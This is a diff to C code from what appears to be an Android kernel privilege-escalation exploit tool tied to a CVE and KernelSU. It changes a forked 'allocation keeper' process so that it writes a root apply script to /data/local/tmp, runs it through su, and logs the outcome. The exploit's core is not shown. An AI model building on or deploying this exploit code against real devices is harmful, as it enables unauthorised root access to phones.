@@ -192,6 +192,9 @@ void run_main_route_threads(void) {
 }
 #endif
 
+#define KEEPER_APPLY_SCRIPT_PATH "/data/local/tmp/.cve43499-apply.sh"
+#define KEEPER_LOG_PATH "/data/local/tmp/ksu-keeper.log"
+
 static pid_t spawn_allocation_keeper(void) {
   pid_t child = SYSCHK(fork());
   if (child != 0) {
@@ -205,16 +208,37 @@ static pid_t spawn_allocation_keeper(void) {
    * any big perf core. The prime core stays reserved for the exploit. */
   pin_perf_mask();
 
+  /* Persist the apply script to a file and invoke it as a short
+   * `su -c "sh <path>"`: long inline scripts through KernelSU sucompat are
+   * fragile, and every earlier attempt output went to /dev/null which made
+     keeper failures undiagnosable. The log keeps the last attempts. */
+  {
+    int sfd = open(KEEPER_APPLY_SCRIPT_PATH,
+                   O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
+    if (sfd >= 0) {
+      ssize_t ignored =
+          write(sfd, KSU_APPLY_SCRIPT, sizeof(KSU_APPLY_SCRIPT) - 1);
+      (void)ignored;
+      close(sfd);
+    }
+  }
   int null_fd = (int)syscall(
       SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
-  if (null_fd >= 0) {
-    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
-      if (null_fd != fd) {
-        syscall(SYS_dup3, null_fd, fd, 0);
-      }
-    }
+  int log_fd = (int)syscall(SYS_openat, AT_FDCWD, KEEPER_LOG_PATH,
+                            O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
+  if (log_fd < 0) {
+    log_fd = null_fd;
+  }
+  if (null_fd >= 0 || log_fd >= 0) {
+    int in_fd = null_fd >= 0 ? null_fd : log_fd;
+    syscall(SYS_dup3, in_fd, STDIN_FILENO, 0);
+    syscall(SYS_dup3, log_fd, STDOUT_FILENO, 0);
+    syscall(SYS_dup3, log_fd, STDERR_FILENO, 0);
     if (null_fd > STDERR_FILENO) {
       syscall(SYS_close, null_fd);
+    }
+    if (log_fd > STDERR_FILENO) {
+      syscall(SYS_close, log_fd);
     }
   } else {
     syscall(SYS_close, STDIN_FILENO);
@@ -271,7 +295,8 @@ static pid_t spawn_allocation_keeper(void) {
     if (!modules_done_this_boot()) {
       pid_t ap = fork();
       if (ap == 0) {
-        execl("/system/bin/su", "su", "-c", KSU_APPLY_SCRIPT, (char *)NULL);
+        execl("/system/bin/su", "su", "-c",
+              "sh " KEEPER_APPLY_SCRIPT_PATH, (char *)NULL);
         _exit(127);
       }
       if (ap > 0) {
@@ -279,6 +304,9 @@ static pid_t spawn_allocation_keeper(void) {
         while (waitpid(ap, &status, 0) < 0 && errno == EINTR) {
         }
         int rc = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
+        dprintf(STDOUT_FILENO,
+                "keeper apply rc=%d streak=%d uptime=%ld\n", rc,
+                fail_streak, ksu_uptime_sec());
         if (rc == 0) {
           mark_modules_done();
           fail_streak = 0;
